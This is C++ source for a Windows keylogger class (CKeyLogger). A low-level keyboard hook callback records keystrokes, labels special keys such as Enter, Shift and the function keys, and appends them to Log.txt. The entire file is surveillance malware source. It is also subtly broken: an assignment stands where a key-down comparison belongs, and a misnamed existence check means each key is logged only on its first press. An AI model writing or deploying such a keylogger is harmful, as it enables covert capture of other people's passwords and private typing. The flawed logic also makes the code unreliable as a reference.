#include "KeyLogger.h"

CKeyLogger keyLg;

CKeyLogger::CKeyLogger()
{
	m_ofstrOut.open("Log.txt");
}

CKeyLogger::~CKeyLogger()
{
	m_ofstrOut.close();
	m_mapKeyCodes.clear();
}

void CKeyLogger::fnSetKeyCode(int code, std::string keyName)
{
	m_mapKeyCodes[code] = keyName;
}

bool CKeyLogger::fnCheckIfElementExist(PKBDLLHOOKSTRUCT p)
{
	return (m_mapKeyCodes.find(p->vkCode) == m_mapKeyCodes.end());
}

void CKeyLogger::fnWriteToFile(std::string text)
{
	m_ofstrOut << text << " , ";
}

std::string CKeyLogger::fnGetKeyCode(int code)
{
	return m_mapKeyCodes[code];
}

LRESULT CALLBACK fnKeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	std::string s;
	
	// If key is being pressed
	if (wParam = WM_KEYDOWN) 
	{
		s = (char(tolower(p->vkCode)));
		if (keyLg.fnCheckIfElementExist(p))
		{
			switch (p->vkCode)
			{
			case VK_CAPITAL:	 keyLg.fnSetKeyCode(p->vkCode,  "<CAPS_LOCK>");		break;
			case VK_RSHIFT:		 keyLg.fnSetKeyCode(p->vkCode,  "<RSHIFT>");		break;
			case VK_LSHIFT:		 keyLg.fnSetKeyCode(p->vkCode,  "<LSHIFT>");		break;
			case VK_LMENU:		 keyLg.fnSetKeyCode(p->vkCode,  "<LALT>");			break;
			case VK_RMENU:		 keyLg.fnSetKeyCode(p->vkCode,  "<RALT>");			break;
			case VK_LWIN:		 keyLg.fnSetKeyCode(p->vkCode,  "<LWIN>");			break;
			case VK_RWIN:		 keyLg.fnSetKeyCode(p->vkCode,  "<RWIN>");			break;
			case VK_F1:			 keyLg.fnSetKeyCode(p->vkCode,  "<F1>");			break;
			case VK_F2:			 keyLg.fnSetKeyCode(p->vkCode,  "<F2>");			break;
			case VK_F3:			 keyLg.fnSetKeyCode(p->vkCode,  "<F3>");			break;
			case VK_F4:			 keyLg.fnSetKeyCode(p->vkCode,  "<F4>");			break;
			case VK_F5:			 keyLg.fnSetKeyCode(p->vkCode,  "<F5>");			break;
			case VK_F6:			 keyLg.fnSetKeyCode(p->vkCode,  "<F6>");			break;
			case VK_F7:			 keyLg.fnSetKeyCode(p->vkCode,  "<F7>");			break;
			case VK_F8:			 keyLg.fnSetKeyCode(p->vkCode,  "<F8>");			break;
			case VK_F9:			 keyLg.fnSetKeyCode(p->vkCode,  "<F9>");			break;
			case VK_F10:		 keyLg.fnSetKeyCode(p->vkCode,  "<F10>");			break;
			case VK_F11:		 keyLg.fnSetKeyCode(p->vkCode,  "<F11>");			break;
			case VK_F12:		 keyLg.fnSetKeyCode(p->vkCode,  "<F12>");			break;
			case VK_NUMLOCK:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMLOCK>");		break;
			case VK_SCROLL:		 keyLg.fnSetKeyCode(p->vkCode,  "<SCRLLOCK>");		break;
			case VK_NUMPAD0:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD0>");		break;
			case VK_NUMPAD1:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD1>");		break;
			case VK_NUMPAD2:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD2>");		break;
			case VK_NUMPAD3:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD3>");		break;
			case VK_NUMPAD4:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD4>");		break;
			case VK_NUMPAD5:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD5>");		break;
			case VK_NUMPAD6:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD6>");		break;
			case VK_NUMPAD7:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD7>");		break;
			case VK_NUMPAD8:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD8>");		break;
			case VK_NUMPAD9:	 keyLg.fnSetKeyCode(p->vkCode,  "<NUMPAD9>");		break;
			case VK_ESCAPE:		 keyLg.fnSetKeyCode(p->vkCode,  "<ESC>");			break;
			case VK_SPACE:		 keyLg.fnSetKeyCode(p->vkCode,  "<SPACE>");			break;
			case VK_PRIOR:		 keyLg.fnSetKeyCode(p->vkCode,  "<PGUP>");			break;
			case VK_NEXT:		 keyLg.fnSetKeyCode(p->vkCode,  "<PGDOWN>");		break;
			case VK_PAUSE:		 keyLg.fnSetKeyCode(p->vkCode,  "<PAUSE>");			break;
			case VK_HOME:		 keyLg.fnSetKeyCode(p->vkCode,  "<HOME>");			break;
			case VK_LCONTROL:	 keyLg.fnSetKeyCode(p->vkCode,  "<LCTRL>");			break;
			case VK_RCONTROL:	 keyLg.fnSetKeyCode(p->vkCode,  "<RCTRL>");			break;
			case VK_INSERT:		 keyLg.fnSetKeyCode(p->vkCode,  "<INSERT>");		break;
			case VK_HELP:		 keyLg.fnSetKeyCode(p->vkCode,  "<HELP>");			break;
			case VK_TAB:		 keyLg.fnSetKeyCode(p->vkCode,  "<TAB>");			break;
			case VK_RETURN:		 keyLg.fnSetKeyCode(p->vkCode,  "<ENTER>");			break;
			case VK_SNAPSHOT:	 keyLg.fnSetKeyCode(p->vkCode,  "<PRTSC>");			break;
			case VK_END:		 keyLg.fnSetKeyCode(p->vkCode,  "<END>");			break;
			case VK_PRINT:		 keyLg.fnSetKeyCode(p->vkCode,  "<PRINT>");			break;
			case VK_DELETE:		 keyLg.fnSetKeyCode(p->vkCode,  "<DEL>");			break;
			case VK_LEFT:		 keyLg.fnSetKeyCode(p->vkCode,  "<LEFT>");			break;
			case VK_RIGHT:		 keyLg.fnSetKeyCode(p->vkCode,  "<RIGHT>");			break;
			case VK_UP:			 keyLg.fnSetKeyCode(p->vkCode,  "<UP>");			break;
			case VK_LBUTTON:	 keyLg.fnSetKeyCode(p->vkCode,  "<MOUSE LEFT>");	break;
			case VK_RBUTTON:	 keyLg.fnSetKeyCode(p->vkCode,  "<MOUSE RIGHT>");	break;
			case VK_MBUTTON:	 keyLg.fnSetKeyCode(p->vkCode,  "<MOUSE MIDDLE>");	break;
			case VK_DOWN:		 keyLg.fnSetKeyCode(p->vkCode,  "<DOWN>");			break;
			default:
				 keyLg.fnSetKeyCode(p->vkCode, s);
			}
			keyLg.fnWriteToFile(keyLg.fnGetKeyCode(p->vkCode));
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
